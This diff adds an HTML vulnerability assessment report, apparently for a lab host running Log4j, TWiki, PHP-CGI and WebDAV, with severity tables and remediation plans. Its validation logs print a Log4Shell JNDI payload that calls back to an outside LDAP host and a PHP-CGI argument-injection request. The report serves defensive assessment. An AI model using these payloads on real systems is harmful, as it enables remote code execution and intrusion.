@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Executive Vulnerability Assessment Report - Project #1 Scan</title>
+    <style>
+        :root {
+            --primary-color: #0f172a;
+            --secondary-color: #1e293b;
+            --accent-blue: #3b82f6;
+            --color-critical: #ef4444;
+            --color-high: #f97316;
+            --color-medium: #eab308;
+            --color-low: #22c55e;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --bg-card: #1e293b;
+            --border-color: #334155;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0b0f19;
+            color: var(--text-main);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 20px;
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-title h1 {
+            margin: 0;
+            font-size: 2.2rem;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+        }
+
+        .header-title p {
+            margin: 5px 0 0 0;
+            color: var(--text-muted);
+            font-size: 1rem;
+        }
+
+        .badge-status {
+            background-color: rgba(239, 64, 64, 0.15);
+            border: 1px solid var(--color-critical);
+            color: var(--color-critical);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.85rem;
+        }
+
+        /* Metrics Dashboard grid */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .metric-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s;
+        }
+
+        .metric-card:hover {
+            transform: translateY(-2px);
+        }
+
+        .metric-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+        }
+
+        .metric-card.critical::before { background-color: var(--color-critical); }
+        .metric-card.high::before { background-color: var(--color-high); }
+        .metric-card.medium::before { background-color: var(--color-medium); }
+        .metric-card.low::before { background-color: var(--color-low); }
+        .metric-card.total::before { background-color: var(--accent-blue); }
+
+        .metric-number {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin: 10px 0;
+        }
+
+        .metric-label {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Scope Box */
+        .info-box {
+            background-color: #131926;
+            border-left: 4px solid var(--accent-blue);
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 40px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .info-item span {
+            display: block;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .info-item strong {
+            font-size: 1.05rem;
+            color: #ffffff;
+        }
+
+        /* General Tables style */
+        .table-responsive {
+            overflow-x: auto;
+            margin-bottom: 40px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            background-color: var(--bg-card);
+            font-size: 0.95rem;
+        }
+
+        th {
+            background-color: #131926;
+            color: #ffffff;
+            padding: 16px;
+            font-weight: 600;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        td {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+            color: #e2e8f0;
+        }
+
+        tr:hover td {
+            background-color: #243146;
+        }
+
+        .badge-vuln {
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.75rem;
+            display: inline-block;
+        }
+
+        .badge-vuln.critical { background-color: rgba(239, 64, 64, 0.2); color: #ff6b6b; border: 1px solid var(--color-critical); }
+        .badge-vuln.high { background-color: rgba(249, 115, 22, 0.2); color: #ff9a52; border: 1px solid var(--color-high); }
+        .badge-vuln.medium { background-color: rgba(234, 179, 8, 0.2); color: #ffee55; border: 1px solid var(--color-medium); }
+        .badge-vuln.low { background-color: rgba(34, 197, 94, 0.2); color: #69db7c; border: 1px solid var(--color-low); }
+
+        /* Technical Breakdown Sections */
+        .section-title {
+            font-size: 1.5rem;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            color: #ffffff;
+            border-left: 4px solid var(--accent-blue);
+            padding-left: 12px;
+        }
+
+        .vuln-detail-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+
+        .vuln-detail-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+
+        .vuln-title {
+            font-size: 1.25rem;
+            font-weight: bold;
+            margin: 0;
+            color: #ffffff;
+        }
+
+        .vuln-meta {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        .vuln-body h4 {
+            margin: 15px 0 5px 0;
+            color: #cbd5e1;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .vuln-body p {
+            margin: 0 0 10px 0;
+            color: #e2e8f0;
+            font-size: 0.95rem;
+        }
+
+        code-block {
+            display: block;
+            background-color: #0f172a;
+            border: 1px solid #334155;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.88rem;
+            color: #38bdf8;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin: 10px 0;
+        }
+
+        .solution-box {
+            background-color: rgba(34, 197, 94, 0.08);
+            border: 1px dashed rgba(34, 197, 94, 0.4);
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+        }
+
+        .solution-box strong {
+            color: #4ade80;
+        }
+
+        .team-matrix {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .team-card {
+            background-color: #131926;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 20px;
+        }
+
+        .team-card h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+            color: #ffffff;
+        }
+
+        .team-card ul {
+            margin: 0;
+            padding-left: 20px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .team-card li {
+            margin-bottom: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <div class="header-title">
+            <h1>Vulnerability Assessment & Architecture Report</h1>
+            <p>Automated Penetration Mapping Pipeline & Remediation Strategy</p>
+        </div>
+        <div class="badge-status">ACTION REQUIRED // CRITICAL THREATS FOUND</div>
+    </header>
+
+    <div class="info-box">
+        <div class="info-item">
+            <span>TARGET ASSESSMENT HOST</span>
+            <strong>192.168.255.128</strong>
+        </div>
+        <div class="info-item">
+            <span>PIPELINE TASK PROFILE</span>
+            <strong>Project #1 Scan</strong>
+        </div>
+        <div class="info-item">
+            <span>SCAN TIMESTAMPS (UTC)</span>
+            <strong>May 30, 2026 08:17:51 — 08:40:44</strong>
+        </div>
+        <div class="info-item">
+            <span>AUTHENTICATION STATUS</span>
+            <strong>SMB Authentication: SUCCESS (Port 445)</strong>
+        </div>
+    </div>
+
+    <div class="dashboard-grid">
+        <div class="metric-card critical">
+            <div class="metric-label">Critical Risks</div>
+            <div class="metric-number" style="color: var(--color-critical);">3</div>
+            <div class="metric-label">CVSS 10.0</div>
+        </div>
+        <div class="metric-card high">
+            <div class="metric-label">High Risks</div>
+            <div class="metric-number" style="color: var(--color-high);">3</div>
+            <div class="metric-label">CVSS 7.0 - 8.9</div>
+        </div>
+        <div class="metric-card medium">
+            <div class="metric-label">Medium Risks</div>
+            <div class="metric-number" style="color: var(--color-medium);">21</div>
+            <div class="metric-label">CVSS 4.0 - 6.9</div>
+        </div>
+        <div class="metric-card low">
+            <div class="metric-label">Low Risks</div>
+            <div class="metric-number" style="color: var(--color-low);">3</div>
+            <div class="metric-label">CVSS 0.1 - 3.9</div>
+        </div>
+        <div class="metric-card total">
+            <div class="metric-label">Total Selected</div>
+            <div class="metric-number" style="color: var(--accent-blue);">30</div>
+            <div class="metric-label">441 Pre-filtered</div>
+        </div>
+    </div>
+
+    <div class="section-title">Vulnerability Mapping Matrix</div>
+    <div class="table-responsive">
+        <table>
+            <thead>
+                <tr>
+                    <th>Port/Service ID</th>
+                    <th>Vulnerability Network Technology (NVT) Name</th>
+                    <th>Threat Level</th>
+                    <th>CVSS Score</th>
+                    <th>QoD Accuracy</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>general/tcp</strong></td>
+                    <td>Operating System (OS) End of Life (EOL) Detection</td>
+                    <td><span class="badge-vuln critical">CRITICAL</span></td>
+                    <td><strong>10.0</strong></td>
+                    <td>80%</td>
+                </tr>
+                <tr>
+                    <td><strong>8082/tcp</strong></td>
+                    <td>Apache Log4j 2.0.x Multiple Vulnerabilities (Log4Shell Remote Check)</td>
+                    <td><span class="badge-vuln critical">CRITICAL</span></td>
+                    <td><strong>10.0</strong></td>
+                    <td>100%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>TWiki &lt; 4.2.4 Multiple XSS & Command Execution Vulnerabilities</td>
+                    <td><span class="badge-vuln critical">CRITICAL</span></td>
+                    <td><strong>10.0</strong></td>
+                    <td>80%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>PHP &lt; 5.3.13, 5.4.x &lt; 5.4.3 Multiple Argument Injection Vulnerabilities</td>
+                    <td><span class="badge-vuln high">HIGH</span></td>
+                    <td><strong>7.5</strong></td>
+                    <td>95%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>EasyPHP Webserver 12.1 Authentication Bypass / Info Disclosure</td>
+                    <td><span class="badge-vuln high">HIGH</span></td>
+                    <td><strong>7.5</strong></td>
+                    <td>99%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>Test HTTP Dangerous Methods Active (PUT / DELETE Enabled)</td>
+                    <td><span class="badge-vuln high">HIGH</span></td>
+                    <td><strong>7.5</strong></td>
+                    <td>99%</td>
+                </tr>
+                <tr>
+                    <td><strong>445/tcp</strong></td>
+                    <td>Samba Daemon Input Sanitization Failure (username map script)</td>
+                    <td><span class="badge-vuln medium">MEDIUM</span></td>
+                    <td><strong>6.8</strong></td>
+                    <td>90%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>TWiki Cross-Site Request Forgery (CSRF) Flaw (Sep 2010)</td>
+                    <td><span class="badge-vuln medium">MEDIUM</span></td>
+                    <td><strong>6.8</strong></td>
+                    <td>80%</td>
+                </tr>
+                <tr>
+                    <td><strong>8084/tcp</strong></td>
+                    <td>jQuery &lt; 1.9.0 Cross-Site Scripting Reference Defect</td>
+                    <td><span class="badge-vuln medium">MEDIUM</span></td>
+                    <td><strong>6.1</strong></td>
+                    <td>80%</td>
+                </tr>
+                <tr>
+                    <td><strong>8081/tcp</strong></td>
+                    <td>DVWA Session Token Defect (PHPSESSID Missing HttpOnly Attribute)</td>
+                    <td><span class="badge-vuln medium">MEDIUM</span></td>
+                    <td><strong>5.3</strong></td>
+                    <td>85%</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="section-title">Deep Technical Vulnerability Breakdown</div>
+
+    <div class="vuln-detail-card">
+        <div class="vuln-detail-header">
+            <div>
+                <h3 class="vuln-title">🔥 Apache Log4j 2.0.x Multiple Vulnerabilities (Log4Shell RCE)</h3>
+                <div class="vuln-meta">Port: 8082/tcp | Protocol: HTTP | OID: 1.3.6.1.4.1.25623.1.0.117823</div>
+            </div>
+            <span class="badge-vuln critical">CRITICAL (CVSS: 10.0)</span>
+        </div>
+        <div class="vuln-body">
+            <h4>Vulnerability Insight</h4>
+            <p><strong>CVE-2021-44228 / CVE-2021-45046:</strong> Apache Log4j2 JNDI features used in log messages and parameters do not validate user input against attacker-controlled directory layers (LDAP/RMI). An attacker injecting a crafted string into any HTTP payload header triggers an external server call, executing arbitrary malicious Java bytecode inside the system execution context.</p>
+            
+            <h4>Technical Validation Log (Exploit Proof)</h4>
+            <p>The scanner injected a custom string into multiple concurrent HTTP header vectors. The target engine processed the input and sent an unauthorized telemetry callback to the scanner instance:</p>
+            <code-block>
+Injected Resource Target: http://192.168.255.128:8082/
+Injected Header Payloads Matrix:
+├── HTTP "Accept" Header: ${jndi:ldap://192.168.255.129:29849/a}
+├── HTTP "User-Agent" Header: ${jndi:ldap://192.168.255.129:29849/a}
+└── HTTP "X-Api-Version" Header: ${jndi:ldap://192.168.255.129:29849/a}
+
+[+] OUTBOUND CONNECTION TRIGGERED SUCCESS:
+├── Destination Scanner Node: 192.168.255.129
+└── Target Callback Listener Channel: 29849/tcp
+            </code-block>
+
+            <div class="solution-box">
+                <strong>🛡️ Remediation Plan:</strong> Update the embedded Apache Log4j binary architecture immediately to version 2.12.2, 2.16.0 or higher. If integration is locked down by vendor dependencies, set the environment variable <code>LOG4J_FORMAT_MSG_NO_LOOKUPS="true"</code> to explicitly block malicious JNDI string interpolation.
+            </div>
+        </div>
+    </div>
+
+    <div class="vuln-detail-card">
+        <div class="vuln-detail-header">
+            <div>
+                <h3 class="vuln-title">🔥 TWiki &lt; 4.2.4 Arbitrary Code & Eval Injection Engine</h3>
+                <div class="vuln-meta">Port: 8084/tcp | Software: TWiki v01.Feb.2003 | CVE-2008-5304 / 5305</div>
+            </div>
+            <span class="badge-vuln critical">CRITICAL (CVSS: 10.0)</span>
+        </div>
+        <div class="vuln-body">
+            <h4>Vulnerability Insight</h4>
+            <p>The integrated TWiki platform contains systematic validation omissions. The internal <code>%URLPARAM%</code> syntax parameter is vulnerable to severe sanitization bypasses, enabling full Cross-Site Scripting (XSS). Furthermore, the core <code>%SEARCH%</code> component passes unsanitized variables straight into a native Perl <code>eval()</code> interpreter block, triggering a raw execution conduit for unauthorized host commands.</p>
+
+            <div class="solution-box">
+                <strong>🛡️ Remediation Plan:</strong> Replace legacy scripts and patch the application core by updating to a stable distribution of TWiki 4.2.4 or version 4.3.2 (which patches the associated CSRF vulnerability tracked under CVE-2009-4898).
+            </div>
+        </div>
+    </div>
+
+    <div class="vuln-detail-card">
+        <div class="vuln-detail-header">
+            <div>
+                <h3 class="vuln-title">🔥 Operating System End of Life (EOL) Exposure</h3>
+                <div class="vuln-meta">Port: general/tcp | OS: Canonical Ubuntu Linux 8.04 | EOL Date: 2013-05-09</div>
+            </div>
+            <span class="badge-vuln critical">CRITICAL (CVSS: 10.0)</span>
+        </div>
+        <div class="vuln-body">
+            <h4>Vulnerability Insight</h4>
+            <p>The host infrastructure runs on an obsolete operating system version that has lacked vendor engineering maintenance, patch streams, and security updates for over a decade. Any newly identified kernel or network layer vulnerabilities can easily be weaponized to achieve total host compromise without remediation paths.</p>
+
+            <div class="solution-box">
+                <strong>🛡️ Remediation Plan:</strong> Migrate host applications away from the legacy platform. Rebuild services into modern, maintained container runtimes or update the system to an active Long Term Support (LTS) kernel distribution.
+            </div>
+        </div>
+    </div>
+
+    <div class="vuln-detail-card">
+        <div class="vuln-detail-header">
+            <div>
+                <h3 class="vuln-title">⚡ PHP CGI Argument Injection & Remote Shell Deployment</h3>
+                <div class="vuln-meta">Port: 8084/tcp | CVE-2012-1823 | QoD: 95%</div>
+            </div>
+            <span class="badge-vuln high">HIGH (CVSS: 7.5)</span>
+        </div>
+        <div class="vuln-body">
+            <h4>Vulnerability Insight</h4>
+            <p>When configured within CGI interfaces (e.g., Apache mod_cgid), the PHP parsing environment parses query parameters directly as executable command-line switches. This design flaw lets unauthenticated network users pass dangerous switches like <code>-s</code>, <code>-d</code>, or <code>-c</code> straight into the system binary, exposing application source files or executing remote PHP code arguments.</p>
+            
+            <h4>Technical Validation Log</h4>
+            <code-block>
+HTTP POST Request Payload Vector:
+├── Target Endpoint: http://192.168.255.128:8084/cgi-bin/php?%2D%64+allow%5Furl%5Finclude%3Don+%2D%64+safe%5Fmode%3Doff
+└── Dynamic Shell Body Injection: &lt;?php phpinfo();?&gt;
+
+[+] EXECUTED OUTPUT RESPONSE CONFIRMED:
+└── Engine outputs system-wide phpinfo() block (Configuration File /etc/php5/cgi)
+            </code-block>
+
+            <div class="solution-box">
+                <strong>🛡️ Remediation Plan:</strong> Update the runtime setup to PHP 5.3.13, 5.4.3 or modern engine versions. Remove legacy CGI execution routes and implement PHP-FPM for script handling.
+            </div>
+        </div>
+    </div>
+
+    <div class="vuln-detail-card">
+        <div class="vuln-detail-header">
+            <div>
+                <h3 class="vuln-title">⚡ Dangerous HTTP Configuration: Active WebDAV Write Access</h3>
+                <div class="vuln-meta">Port: 8084/tcp | Service: Apache WebDAV / HTTP Method Test</div>
+            </div>
+            <span class="badge-vuln high">HIGH (CVSS: 7.5)</span>
+        </div>
+        <div class="vuln-body">
+            <h4>Vulnerability Insight</h4>
+            <p>The web server configuration permits hazardous HTTP verbs (<code>PUT</code> and <code>DELETE</code>) over unauthenticated endpoints. This misconfiguration allows malicious users to upload custom files or web shells to the storage root, or delete critical operational application files.</p>
+            
+            <h4>Technical Validation Log</h4>
+            <code-block>
+[+] PUT TRANSACTION VERIFIED:
+└── File uploaded successfully to: http://192.168.255.128:8084/dav/puttest978255587.html
+
+[+] DELETE TRANSACTION VERIFIED:
+└── File purged successfully from target web root directory structure
+            </code-block>
+
+            <div class="solution-box">
+                <strong>🛡️ Remediation Plan:</strong> Modify the global Apache configuration files (<code>httpd.conf</code> / <code>web.xml</code>) to completely disable <code>PUT</code> and <code>DELETE</code> methods, or apply strict token authorization barriers inside the <code>&lt;Limit&gt;</code> directive block.
+            </div>
+        </div>
+    </div>
+
+    <div class="section-title">Incident Response Escalation Matrix</div>
+    <p>To safely isolate and patch these issues across enterprise networks, responsibilities are split between our core tactical operational units:</p>
+    
+    <div class="team-matrix">
+        <div class="team-card">
+            <h3 style="color: #60a5fa;">📍 SOC (Security Operations Center)</h3>
+            <ul>
+                <li>Provides real-time event telemetry monitoring via SIEM log collection pipelines.</li>
+                <li>Identifies brute-force or exploitation attempts targeting ports 8082, 8084, and 445.</li>
+                <li>Filters false positives and logs suspicious activity indicators.</li>
+            </ul>
+        </div>
+        <div class="team-card">
+            <h3 style="color: #f87171;">📍 CSIRT (Computer Security Incident Response Team)</h3>
+            <ul>
+                <li>Handles tactical emergency containment playbooks.</li>
+                <li>Isolates host 192.168.255.128 from production network zones.</li>
+                <li>Terminates vulnerable active web connections and blocks exploitation vectors.</li>
+            </ul>
+        </div>
+        <div class="team-card">
+            <h3 style="color: #4ade80;">📍 CERT (Computer Emergency Response Team)</h3>
+            <ul>
+                <li>Coordinates long-term risk tracking and root-cause analysis audits.</li>
+                <li>Oversees patch management pipelines for legacy software architectures.</li>
+                <li>Aligns infrastructure baselines with compliance standards.</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
